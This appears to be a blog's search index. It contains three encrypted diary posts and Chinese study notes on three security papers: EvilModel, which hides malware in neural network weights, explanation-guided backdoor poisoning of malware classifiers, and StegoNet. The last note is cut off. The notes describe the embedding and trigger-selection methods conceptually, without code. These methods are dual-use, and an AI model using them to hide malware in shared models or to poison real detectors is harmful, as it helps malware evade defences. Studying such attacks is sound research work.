<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021.01.16(学期总结)</title>
    <url>/2021/01/16/2021-01-21(%E5%AD%A6%E6%9C%9F%E6%80%BB%E7%BB%93)/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="04b21fa9b0e3b2212b3671f2108e21afd7ae7f4378328a3a93c02635a4f9fbac">c611e0d6df25d274b57909b85be518c87d86ecf916881749feebd9b61112289f72bf9febe66b0aba621ef2fe44ca2b000238573f7de7edbebbd02a6c096f47a00bb65572afe80283103d24baf0c0b983a664ec89d61ecd06fb4a24dcfb130a928ecc944dde5f8eee0ca6ccaf1bd63ba1c218a0de3909e48ea55c8e3a3ef5a751c76088f9a474c4efb11adad7499b9c55484d9b5933785a50bba2c74402d29e7595163fed167d79d845d80f743b672d6a44a2b37f8a83f207e52f3af445682a5a381c017c1eb2cebebbdcf603b176a0146482e7e740f5122a0d2aaeb0f5c42b46c3ad52cd03324a573fd1ca5699cfec5791e37ad75e30b94a6f7a537174842f0a92d1ab3c0fc82e1964eb0c735bfe117d8b802012e0914dce7ebd2e2c03ba698d9b60af8ea9ef765224597d7b976f97316cfa055d90ad9c8f902afb534337dd236b58fbe006b650aed15c3d99a886f0826c6720341688f26313ea8516cabeadbdc14f7cf56ed8a8b8c149913e40cdecfbf48d2354d84442d7e8e056d413915360a74e31f7fecba625508a9c73abc89f42fe099bf2845cae051fdc8c23012ebda2a0af16bfe0b070efc01b632531e5e7dcd92e842da402a678f395bcfbb390521ddc7ad1a23baf7d73090b46d224dc9c69fad288ea4b8ee2a0e62eadc7ea966f896a53a858f1604e4d9b9648ccc4e7598ba1639cd04ff48b7f6b0285812ebf990f317e07e08a7e70009a1441ef28c9d1897ec829e99bc95ef3b626c2412b3c93d02460d0d137d1a8449bded6fa1ce7fdd37e2a0b9d8ec50fa19784b9a900ede4854b04135f67258ecd6c4f4e129b1cde2246b64fda8a0dbee47eb7e5b82cdaf66305f561a9c98153f4874cf5f96bd5a7632dec72223770d2fcc3555ef2ca6f2eb9228dd294bf226f7f6dc90b54478fd1532592b112c836066fc1c5cb4801e94fc28568c598695b0aaa807e16e5f23e99142a89ba863095a5349844b465f9296eb8710df165aa72730e60c755b1e8ea5fd4b51891a5223b7a52bc9e3c858273478d818dce15e0b85c344bb153d8769315ae1db3d6847d6558298cc1078446f23306bcd92e5bd002500b5631559d69329274b34f24a0049bdfe2400b07d4d30d0a99a2cb79b3d43a3a1bc4053b5208a06a412734374fc600e548bb96563fb647e3fb41dabbfa769e5f0eded23a620c665b85122e8d4bf77f1cf3c34db7db7a872167863a4f43ce560655058db1b0023d16084400aad95562e17bcd65910a8c5555f9e466bb120e873d25416e42f29c0a26cfcf2d21f36fcc77881242ca23a85323c33dc0e64e56f4b63b5a940cf6c7ecee40be54298036905461ea0ef4a58687920ad4d7793cb7ff8d557e48504a7dc02f18a7a41e34fdf42d9042ef589ee8e10bda75036b07192c85f3eabb43262a41228687b9c6b0a0d8bbd6557e2ac7857758816be2768d224385ea5d55a77dc5a8f918ff4fb681c51b3d3fe95ab776b441bda3acc73e3b076a8ea4cba8bd7429584321e534e5c16d75f8586d9d5ceacd83de370848747681f8d6f0d7c19e1da9bce4f3ad46391c536ab74afdef5789b9a7f2006879a5dfa2bf9ed976e77630d05540ebb069d84b6489de2e3e702ced6b62fceed4cd9d1126ee7743ec97e9cfd36837eccdab2199bab027d2616a8210fc8f579e10e952eda3ae798349597eeaa19c4b7807d152af20fc837076585fc9b3feb360f7eb848792ddd627b61cf7658b3790cdc16f439b0c054e75a835c6e33d9acb7f20c3f111c2678ce9f26772f42b5df1e273a5e395d81dee35483734c5f616cecb41aa59efcb1e6ff54adad1fd0cb062c73accf5e129f688612ef6bc2ea17ab0d4b905f78c6f398db3fa910e106f22649e9b530aba59d8161e46c45605664155d8722b4b823dc1937e99b75e55abf2578092a86daeef1fa087c31fd60532d7a170ece8cf74f7084b40275d4fabdef6a48434f13736ad4fc8565e1271a60160cc3536c83bf7ff5d55c2500e9f7589d082a19a2f2ae5f41edf0016f9a0634b35190c71ba86ad80434fb6ca828d7c1a2302eede62d5555b8d69ef2d2df85e86e046ded4ff19d4f3012dea564bd52f5372be4d78212955dad2bdfcd5802744f844f2e3a4cfae0ff8223b9a5ba22818449c0177fe12b406b1f0b826f05235296d304ef0067ad1e4aca2025a2e3bf77ae4cff00cb808181a321825a17d89063148efc48186288da82db273e4fcf1cbc28004bc10312fef003d6ca091f639d1467c52478e51050d6d652eb4bbb1a077905975f8838993523685fcf25ddae47235ee6c604d09fc4be78dd27f11795607691cc2dac2c69032659d4cba9c886b83e7d9af48b898818c807be1862d3e5bc4775e6936726ad96cb0944163aad0b4176a09398d78e73ef6f73408b2bb15afa2d58a68c2d5c3d97c8d04f90cafa955a00ba0631ca7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Emotion</category>
      </categories>
      <tags>
        <tag>sunny</tag>
      </tags>
  </entry>
  <entry>
    <title>2021.03.05(南京行)</title>
    <url>/2021/03/05/2021-03-05(%E5%8D%97%E4%BA%AC)/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c5e7c9fa4a3b6906cee8f603932bb22e51b18d297c8c19481120b0243f59b5a1">c611e0d6df25d274b57909b85be518c87d86ecf916881749feebd9b61112289f72bf9febe66b0aba621ef2fe44ca2b000238573f7de7edbebbd02a6c096f47a0afc77570cc09f1e6e092a1028da2db5a6265cb66886584a3da7d178dd44edc194f2f69d16bf69494a634c7aa596cc97d985f8c4223df93d5c2bcdfe046d507d6c0935fe33f8b4d84ddbc3ed8887491f84ba63d3d8f568ed9e57d179204b5cd83017e43632e2b900365d48cfc808aefc1bc788d536e61810dee0fdddd46119c2a6fb8e22e93a0115bf289de27584ad0662b77cb05f28147220d8f50cb719daa6b32b6ac4658455c03e228f88d55a2834e283c3c4ff568845cf785fdada799038bad1295e4fd25103192ed09783590a7b2a63519dd8110ad246d8346d1aeb0c43ca5dec2581ee261139664513bc64c923cc4f6e695cbf4b530615a0669b8e9b2e60d6b6c1e6444936d0f6477d3fc401f13cf47a3c606d8a94dbd6f0fbc1508c3899f24ce915040557ad6978a12cf9360e5521ff068d5d30742869a39ca1de3a66ec0da1d6948159115cdc90faed6b00fb34ebb64548ebee02457089a2f53c6b02051bfc2dde8f756b72364f513336bd0f9b71ee287f87ba69b0a0c321ae4722257b4feb50273cabd6d597718e066e62880691205630f9e97874f710a12d52b23c428b4f6a826b171b0e26a14688a967f5fded7f343f4a297d14c80a49091d0efc103c9910ecd82436095ad556fed397e88a7b70284fa9bfaadf1f77b48f36c9f5367c820d017de50ee2dc3efc254f8e4aba8d70756d30fc7259325ab53b1f17289bd587133915f64df1f3a0f32e230514764a7ee35590df6611d637496d3c3351355b8ca9b4b34ab05a99c07ac481f3457453aaadc2c53cebd078152c25229dd16bc23a5f48eebb4608691b54826f966487a6d8389a4f085eadd7141c993729c6181131cac2c8bf0ae4c5a810c84431315efb76eef596a16c22433aa798d0d629148d041f8967862b42fb6d17f5d3c500fe02f9a72777e6b2085a4fcac7695c76cb5664660cf15eddc78281dc2960f897b06b22437dab5362ffc1affe04b133c59bf8b7bb33b427a6b034afaee43f11db212f6a43bf8888ae37f84975ad383ea5033f580b61cbcbaf073adc9127ff336e4c6e775f5b0e16204aee6e94c9a727e274bc5c141e9345e89c5162caf4710e81f80b33d13b3027a1dd11f1fc1c686c839b1b8677b1488ddb5d36045c6c88d4218e019402c744bee7b286be273015bb810b510ac82ad537af5a737721ce4082c95c494b60d1d8e00a0b6fe4dd2068e70cbf1d7fb6315128f3f7256b5ca827fe916091f7eb433001a1ef1b0fafdbce154274a65b006c72dcba8baae649d8cd4a755610568334392b63f12337213bc656e627213c6fbd4f06d77184d121a538e991ff6b5cec65db2cb3b92f75dcd1d6d43409e720125803757d1136a46d1b6149fca86c3a1a7605f4e444011a52b911b44b4215c9012ce425a1593e573cb3e6b870e23a991bcbd6902235d5900628d12a37902441e0df26604c19216e82fedc1cbed3c45efb867af99dad81bc2c11d8bcdd24311cbab743cb44dfe377fdc83490abce05253e2ef6729103a369da4a2c6bd1b4f59d42c78e066b9bfbb891de5e9ce2d10795ca1092f94b4f05e6a42b453d92742f0cd3e20b48d88a9ff5e4d4cb4b66994f2c3e178e24b5806382cd66f4abb8e112eb6a15ad3c805ca86249386194a9207b903dfec25bc6fe8a7e42fa1b3ffc1960512a188938982f993ddbb0e4ef8bf9575429ab215a6c65fef50e1a7deeca69235a8d76e94137f610b0787e32c19c786229679bbaabccf09af0074eeb64c14c27247db15a87ca2c441e9678fab8bbecce827bd8585a13a299301d386ed3e6d6c2ffb08ff6c7fcbe71a802e80b866bfe7c5df597e371dca9bcab1ccfe82624136fd450690915c81feb27ad82fd88efc6a8e34169ef766f9959c0f9c145ff78636fb727a28477365a588cd09b20a4e5a346cf8e97f0712727401613b001f40c891467980de5c9863fad398a917265a3a52ea8f49883e21d016190573966949668dc118d273aee07a22a06e82353f5f76e6345942ac76501616208aa3395f9b533c3cc73c9d0a80c101feaa8cdcb391b0db33747f9a1c9edcec6f6b18f9de3a820ffe7dcc2689a38b2d5bd7a518c5ea0d4013b69afa6431d83dd1f5d56b01e886df3f1a7570c619ae0a866d7c5bb75684cfd14851f5db0e5809a8384f569de75deed7029182bf8a2679623df602d5ebf7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Emotion</category>
      </categories>
      <tags>
        <tag>cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-04-18(C)</title>
    <url>/2021/04/18/2021-04-18/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="da2e1d5b1dc9f5cc94723bcc9021a08f4a46252357d533fccf09c736e9e3a562">1c96eafd450adaaada2ba7d79d68b392e00d38696c128fdcd3863a60aaaef2cb8fccd8b0a157f8dc04290323d8a157aaf0a92150a501a13ed85cfec1bff771b3f59a9249edb6899ca78f0440af81ca65fd4e96e4d68ee86774dbd5b7d2ff961381331568cc98b713989061dc1350d134ee61eb792d09aedd1b656e4672ec1d5189fe95dae582e793abbf66d506957d75a53ddfa663ded5a87a7572410db0c42a35a5b2e6be3f683d1c3283f14b8e389a86c699e5ff45d8e397947652b7b76d9e67649a3e2b5e4d9ab274b9e2bb2777ef5a97352b156c61c9dfcf29e4885cde5447e669c95b2990b574162d977174890af0fb8fdb793871a44c1d1689b2b073e018ff059d508b2875b7b03c2573f4fcb79f4cc8206ae0a9e4ac7d55b880b1838db0ac087ca0f91dca21625c19a07d97c0f580233387aa675be0c56574f2d94f48721f9c1627b9c70f00fd5f264419aa71f0c620ed744701fabbdcd0ac0431e5fa2d3c20e256b1185e6cc8a65d7880471a81db12c961eac4ffd0d3e1bd3976e4271abea7118e362a9b9f3b65b8d8bd4c461eb56050cf70b1dc8327ce7e3235b5ca023c0ca5c240ac09084a124fd2293650d7957ba2f38c08e6dd7e63995def893bd26b5b2ae2f25d5917926ee17ab0b0844fa0fbee5753c184ecfcf95d0acf17a91f9e244ccdaef629b39e0b11d66f16ad0bbf7bc91d3a77dbcddea7163b32353b899e8158743378be7badb0207afc26c22a777ea94d6f60248bb5d81ba7fe6416ccc1020f46a51c47c3d6bb73abf3b2f17587f589595758b23d3f11ce0cc14260745ec0fbeed4c1371b801d1236458e3fc75c3784c352ebe03c3bb3d4d0ae305ee64bac44b8aa8816d1c15e46448def19023b4858258b5da1fe455422245b4af5e9aeb2166f17bc0505e7896352f4d0c825faf0dfbe2c4f6b5fe322f365a7f70662cc48f4aedabb659b6bc129919b0f218918cf94000d4ac3c9d1ac63dd5a848f4cf336f220506290fb1abfd4e677dcf3cf7931c624a57ff8280bb769a3551f1e9d1c7a5f8a91a0d752b1baa3812606db214ee757783f6b8fbcd1bb66db5afe370f4ed1b8cadda0b7c3712786b9469fb48d3fd300b6c47d605f2585be2f07aa39b05549d7c200c1fd52292985bc8c3f0ddcfc04fb4b031d7471f476faa2e7d3b961146f07c0cb15b35fef8b3a9ef1febdc4fa1825c4d2d2f9d26fa9d38e9ebb5dbf994b63b3306c29a8ab19a54b7ae12267b33ee55448312c7ead5a325d163f97bc6bc33f092d8da2dbc0907ed7da004684b866289632e638af6459ece82c66b787e37c27345e5b26640280ed1c967f1bf6f2150b847efcff0913db02a431c06586a7dd43d33a3a776087728cac6f3c2deb4ccff5439af0ac299a0e82b0db025e62d017f627ed56c6df8f96b04acbbb6ad0b93c51e2cd93c62ec100ddc296553f041286092b76ecaab1d2627486e4e73d7be0bee6151cfbce639726430f34a862f3b3488b41dba2e12a3f6a6c7666337189f742bd2243661f766afa2fb0dea823f5cbfcd54b58f975833dd817c30eae12bc222b5af315cf4a694ac63382d119fcff09a9ce5308ce0bed8650d45c60106a67dc7d62c0249166bf9462e2d5a84555b2f982456bf25c8163900276bc41b453153dd7774544c635c3141154b0ae1584e41d59ceb134bfdd01f0b6e841a634a6e882421664582044a83669d0064d7efaaacb5d09841680456b403224355846c0aa1a973fe2bf7f0795944dac2d499eab4a39b6b9bcf261f4d09d803eed11aa24700aac183cffee98061fb7fbfeade452302b50ec2fe4645dfe182395f67b206d22bbebec0f1b6578f15c38a367a3a97e4867a3843679642e43fd3d51b065b10d91923195859374196842372c7a501289685e252624e6f6f3690ef862e57d9125ef1301abb7f42a38a5dddccac83170d268fc4c69bffbd442e28f6259895cdef8bbef8ede9ee08e7fc854c6323c6d23b0f6bada4b7d1e93ea176a7871ba569213dbc99512b5c0e28803a05990ebeefa8c5f0b381f3dc188c3ce62bdb3e2fa202a9d548233e4115b3fbc27fb0dbae6b24ae5da442452e07021ed26810ed91519860a073089535076ce20bdd582f14e2c13483f3f25030044e527f1d0731537bd11b1dd02a04f4b0ebf5825fa97318173cb2ed29f2a9f92573175bf9fde836c849e54bf8b5e922d2a2c199a799f33ba4b224ce36b1900ada9489745d00ee4c87f93849735714b01dd22ec4f29cc32167b95ec3991bae47724c6e294204c2951d6b86439db185f828e233357a632ab09af9a8acd2ff4b76721a8967da815729184320e018ecc4c30042e6416053e2d42fa71f3bb079b8437f4a6f637a5aaac2d269a8aa6537a960a3de794df9c19acea3c2f67fd76cdef1231f1faf7cbfbc851464f6f32ec1ac76e72caa5f30f68e0555005df8ef9dde19dcbf1a40aaf2a5f372eb8d02cd7b807f5fd7971d920b064492211f1d04cbd5248b24f86589fc26ea0bffcb182b12c234f3f72612697c46c5ca527d4b9706cbc647db25ec3e1da8504c4e144aae229e5cad962f65286316413163cd11866ae5b5c3b5b41914a962d0dab428ac4a01013bc652f6fd359374b1186c01d7c10ae93ba90cd956ef5ab2d8e4718c9e219e391b4218391eebb89ed3d77dfa4e1e71eb859e7ebaa594a31d848c270</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Emotion</category>
      </categories>
      <tags>
        <tag>cloudy</tag>
      </tags>
  </entry>
  <entry>
    <title>论文分析：《EvilModel：Hiding Malware Inside of Neural Network Models》</title>
    <url>/2021/08/25/EvilModel%EF%BC%9AHiding%20Malware%20Inside%20of%20Neural%20Network%20Models/</url>
    <content><![CDATA[<h2 id="EvilModel-Hiding-Malware-Inside-of-Neural-Network-Models"><a href="#EvilModel-Hiding-Malware-Inside-of-Neural-Network-Models" class="headerlink" title="EvilModel: Hiding Malware Inside of Neural Network Models"></a>EvilModel: Hiding Malware Inside of Neural Network Models</h2><hr>
<h3 id="一-背景及要解决的问题："><a href="#一-背景及要解决的问题：" class="headerlink" title="一 . 背景及要解决的问题："></a>一 . 背景及要解决的问题：</h3><ul>
<li>背景：<ul>
<li>1）现有成果嵌入率低</li>
<li>2）对模型性能有影响</li>
</ul>
</li>
<li>解决问题：<ul>
<li>在神经网络模型中嵌入恶意代码躲避检测，且不影响模型性能</li>
</ul>
</li>
</ul>
<hr>
<a id="more"></a>
<h3 id="二-相关工作："><a href="#二-相关工作：" class="headerlink" title="二 . 相关工作："></a>二 . 相关工作：</h3><ul>
<li>1）恶意代码躲避检测方法（非深度学习模型）：<ul>
<li>&lt;1&gt; IPFS，分布式系统来传递恶意代码</li>
<li>&lt;2&gt; 利用DNA隐写术绕过电子设备的过滤，信号是用DNA中的四种不同核苷酸加密</li>
<li>&lt;3&gt; 将区块链作为一种隐蔽的通信渠道，将secret commands嵌入到比特币地址中进行传输，但不适用于大量传输</li>
</ul>
</li>
<li>2）恶意代码躲避检测方法（基于嵌入深度学习模型）：<ul>
<li>Stego：<ul>
<li>&lt;1&gt; LSB substitution：DNN模型是冗余的，将恶意代码替换参数的最低有效位</li>
<li>&lt;2&gt; Resilience training：DNN模型具有修复能力，将恶意字节替换参数，在神经元中引入内部错误，模型进行恢复训练，”受损神经元“在再训练期间不会更新</li>
<li>&lt;3&gt; Value-mapping：搜索模型参数以查找与恶意代码段相似的位，并将参数映射或更改到恶意代码，恶意代码可以映射到一个模型中，需要一个排列图，嵌入率低</li>
<li>&lt;4&gt; Sign-mapping：将参数的符号映射到恶意软件位。缺点是限制嵌入恶意代码大小，嵌入率低</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="三-方法："><a href="#三-方法：" class="headerlink" title="三 . 方法："></a>三 . 方法：</h3><ul>
<li><p>整体思路：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/1629896919(1).jpg" alt="1629896919(1)"></p>
<ul>
<li>发送者：<ul>
<li>1） 设计或下载一个模型</li>
<li>2） 用数据集对特定任务进行训练或微调，获得良好的模型性能</li>
<li>3） 选择一个合适的网络层，嵌入恶意代码</li>
<li>4） 评估嵌入恶意代码的恶意模型的性能，如果超出范围，冻结恶意神经元(代码中可用参数设置”冻结“神经元)，并重新训练模型</li>
</ul>
</li>
<li>接收者：<ul>
<li>1）下载模型并提取模型中的恶意代码</li>
<li>2）检查恶意代码完整性，（参数浮点数=&gt;字节数，除去前缀得到二进制流，根据第一个神经元中的偏移值完成恶意代码长度和哈希值校验）</li>
<li>3）接收者运行恶意代码</li>
</ul>
</li>
</ul>
</li>
<li><p>方法先验知识：</p>
<ul>
<li><p>1）神经元可嵌入多少恶意代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210825211109.png" alt="20210825211109"></p>
<p>隐藏层中，对于一个神经元，有n+1个参数(n个权重值，1个偏移值)，因为参数是32位浮点数，所以一个神经元中能嵌入32(n+1)位恶意代码，即4(n+1)字节，所以对于整个隐藏层m个神经元，共可以嵌入4m(n+1)bytes恶意代码</p>
</li>
<li><p>2）浮点数大小可由设置指数位控制在一定范围（也是本论文最核心的创新点）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210825214604.png" alt="20210825214604"></p>
<p>对于浮点数，数值大小可由指数部分决定，通过调整指数部分可以将value控制在一定范围，如当指数为设置为0x3c，以二进制形式存储的浮点数0x3c000000-0x3cffffff对应的浮点数绝对值区间为0.0078-0.0313,这和原神经元中的参数数值差异不大（原神经元中的参数值范围为-0.0258，0.0286），所以合理猜测对于嵌入恶意代码的模型的分类效果不会影响很大（0x3c，0x38，0xbc，0xb8同理）</p>
</li>
</ul>
</li>
<li><p>具体方法-fast substitution：</p>
<p>每次读取3个字节的恶意代码，并在前面添加”\x3c”作为第一个字节，然乎将该4字节数转化为浮点数，如果最后剩余恶意代码不足3字节，则在尾部添加”\x00”补足3字节。然后给定一个神经网络特定层，顺序替换每个神经元的权重值和偏移值。其中权重值用于存储恶意代码，偏移值用于存储恶意代码长度和哈希值以供后续校验</p>
</li>
</ul>
<hr>
<h3 id="四-实验成果和结论："><a href="#四-实验成果和结论：" class="headerlink" title="四 . 实验成果和结论："></a>四 . 实验成果和结论：</h3><ul>
<li>1）靠近输出层的神经网络层更适合嵌入恶意代码</li>
<li>2）在全连接层应用BN（数据归一化，加快网络学习速率，解决梯度爆炸问题）的模型在嵌入恶意代码后分类效果更好</li>
<li>3）178Mb的AlexModel模型可以嵌入36.9Mb的恶意代码，且损失率差异在1%以内</li>
<li>4）与Stego相比，大都嵌入率更高，即便嵌入率同一级别情况下，模型分类准确率更高</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>神经网络，恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title>论文分析：《Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers》</title>
    <url>/2022/01/13/Explanation-Guided%20Backdoor%20Poisoning%20Attacks%20Against%20Malware%20Classifiers/</url>
    <content><![CDATA[<h2 id="Explanation-Guided-Backdoor-Poisoning-Attacks-Against-Malware-Classifiers"><a href="#Explanation-Guided-Backdoor-Poisoning-Attacks-Against-Malware-Classifiers" class="headerlink" title="Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers"></a>Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers</h2><hr>
<ol>
<li><p>论文目的</p>
<p>研究内容： </p>
<ul>
<li>研究针对基于ml的恶意软件分类器的clean-label后门攻击；</li>
</ul>
<p>研究效果：</p>
<ul>
<li>将带有后门的良性样本注入恶意软件检测器的训练集中，改变在推断时对带有相同水印的恶意软件样本的预测；<a id="more"></a>
主要工具：</li>
<li>SHAP（SHapley Additive explanation）</li>
</ul>
<hr>
</li>
<li><p>研究意义：</p>
<p> <img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113124647.png" alt="20220113124647"></p>
<p> 第三方威胁情报平台允许用户(包括攻击者)提交样本，这些样本由二进制文件上运行的现有反病毒(AV)引擎池标记。公司可以从这些平台获取标签数据。训练过程包括一个特征提取步骤(在本例中是PE文件的静态分析)，然后是ML算法训练过程。然后将训练过的恶意软件分类器部署在野外，并应用于新的二进制文件，以生成标签。因此，对手的目标是生成带有后门的良性二进制文件，这些二进制文件将通过这些标签平台传播，并将毒害下游恶意软件分类器的训练集。一旦模型被部署，攻击者将简单地在恶意二进制文件发布之前引入相同的水印，从而确保新的恶意软件活动将躲避后门分类器的检测。</p>
<hr>
</li>
<li><p>攻击者目标：</p>
<p>改变训练过程，使得到的后门分类器 $F_b$ 不同于经过干净训练的分类器 $F$ ，一个理想的 $F_b$ 对一组干净的输入 $x$ 有与 $F$ 完全相同的响应，而当应用到后门输入 $x_b$ 时，它生成一个对抗性选择的预测 $y_b$。</p>
<ul>
<li><p>$F_b(x)=F(x)$</p>
</li>
<li><p>$F(x_b)=y$</p>
</li>
<li><p>$F_b(x_b)=y_b≠y$</p>
<p>为了使攻击不被察觉，对抗者希望最小化poison set和footprint of the trigger(修改特征的数量)。</p>
</li>
</ul>
<hr>
</li>
<li><p>攻击者能力：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113133120.png" alt="20220113133120"></p>
<hr>
</li>
<li><p>研究思想：</p>
<p>在后门中毒攻击中，对手利用对特征(子集)的控制来导致错误分类，因为这些特征维度中存在中毒值。直观地说，攻击在包含触发器的特征子空间内创建一个密度区域，分类器调整其决策边界以适应有毒样本的密度。（即使攻击者只控制一个相对较小的子空间,他们仍然可以影响决策边界：如果有水印点的密度足够高, 或者周围的数据点足够稀疏, 或水印占有一个特别薄弱区域的决策边界模型的置信度很低。）</p>
<p> 攻击思路：（两个想法）</p>
<ul>
<li><p>搜索决策边界附近的弱可信度区域，在那里水印可以淹没现有的弱证据;</p>
</li>
<li><p>破坏已经严重面向良性样本的区域，使后门子空间的密度压倒来自其他附近样本的信号。</p>
</li>
</ul>
<hr>
</li>
<li><p>研究方法：</p>
<ul>
<li><p>特征选择器：</p>
<ul>
<li><p>LargeSHAP：对单个特征的SHAP值进行求和。SHAP值越大，越对goodware的决策重要，反之SHAP值越小，越对malware的决策重要。SHAP值接近0的特征表示是对决策可信度较弱的区域；</p>
</li>
<li><p>LargeAbsSHAP：对单个特征的SHAP绝对值求和，忽略方向性，即发现特征对模型总体的重要性，而不管决策边界的方向。</p>
</li>
</ul>
</li>
<li><p>值选择器：</p>
<ul>
<li><p>MinPopulation: 从子空间的稀疏区域中选择值，简单地在数据集中寻找出现频率最少的值，好处是保证了二进制的语义有效性；</p>
</li>
<li><p>CountSHAP：从高密度的指向goodware的区域中选择值，好处是将水印融入到goodware的背景数据中。</p>
<p> <img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113135235.png" alt="20220113135235"></p>
</li>
<li><p>CountAbsSHAP:和CountSHAP类似，寻找出现频率越高，且越对决策无关的值；</p>
<p> <img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113135319.png" alt="20220113135319"></p>
</li>
</ul>
</li>
<li><p>攻击策略：</p>
<ul>
<li>Independent Selection：<ul>
<li>搜索决策边界附近的弱置信区域，在那里水印可以压倒现有的弱证据。使用LargeAbsSHAP选择最重要的特性，然后使用MinPopulation或CountAbsSHAP选择值。虽然我们发现这种攻击强烈地影响决策边界，缺点是由于水印数据点的独特性，创建出来的backdoor不靠近任何子空间，因此它也相对容易防御。</li>
</ul>
</li>
<li>Greedy Combined Selection：  <ul>
<li>虽然上述的独立选择策略侧重于基于决策边界的薄弱区域识别最有效的水印，但在某些情况下，我们可能希望更仔细地将水印融入背景数据集，并确保保持特征之间的语义关系。在Combined策略中，我们使用贪婪算法有条件地选择新的特征维及其值，使这些值与攻击者数据集中已有的面向goodware的点一致。我们首先使用LargeSHAP选择最面向goodware的特征维度，然后使用CountSHAP选择该维度中密度最高、面向goodware的值。接下来，我们删除所有不具有所选值的数据点，并对以当前触发器为条件的数据子集重复该过程。直观地，我们可以把这个过程看作从现有的goodware样本中识别出语义一致的特征子空间，这些特征子空间可以作为backdoor转移到malware中。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
</li>
<li><p>实验:</p>
<ul>
<li><p>实验数据集：</p>
<ul>
<li>EMBER</li>
</ul>
</li>
<li><p>实验模型：</p>
<ul>
<li>LightGBM，EmberNN</li>
</ul>
</li>
<li><p>实验结果：</p>
<ul>
<li><p>无限制场景：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113140532.png" alt="20220113140532"></p>
</li>
<li><p>限制场景（PE, PDF, Android）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20220113140638.png" alt="20220113140638"></p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>神经网络，恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title>论文分析：《StegoNet:Turn Deep Neural Network into a Stegomalware》</title>
    <url>/2021/09/02/StegoNet:Turn%20Deep%20Neural%20Network%20into%20a%20Stegomalware/</url>
    <content><![CDATA[<h2 id="StegoNet-Turn-Deep-Neural-Network-into-a-Stegomalware"><a href="#StegoNet-Turn-Deep-Neural-Network-into-a-Stegomalware" class="headerlink" title="StegoNet:Turn Deep Neural Network into a Stegomalware"></a>StegoNet:Turn Deep Neural Network into a Stegomalware</h2><hr>
<h3 id="一-背景及要解决的问题："><a href="#一-背景及要解决的问题：" class="headerlink" title="一 . 背景及要解决的问题："></a>一 . 背景及要解决的问题：</h3><ul>
<li>背景：<ul>
<li>传统的Stegomalware将恶意代码嵌入到image、videos中介质中</li>
</ul>
</li>
<li>解决问题：<ul>
<li>在神经网络模型中嵌入恶意代码躲避检测</li>
</ul>
</li>
</ul>
<hr>
<a id="more"></a>
<h3 id="二-相关工作："><a href="#二-相关工作：" class="headerlink" title="二 . 相关工作："></a>二 . 相关工作：</h3><ul>
<li>1）通过恶意样本或中毒攻击，可以攻击DNN分类器的算法漏洞，从而欺骗正常训练的DNN模型，误导DNN推理结果</li>
<li>2）DNN后门可以通过中毒训练数据嵌入到DNN中，以便使用任何输入（包括特定触发器）进行有针对性的错误分类</li>
</ul>
<h3 id="三-贡献："><a href="#三-贡献：" class="headerlink" title="三 . 贡献："></a>三 . 贡献：</h3><ul>
<li><p>1）提出三种恶意代码嵌入方法：</p>
<ul>
<li><p>LSB Substitution</p>
</li>
<li><p>resilience training：值的全部位被替换，且在再训练过程中不被更新</p>
</li>
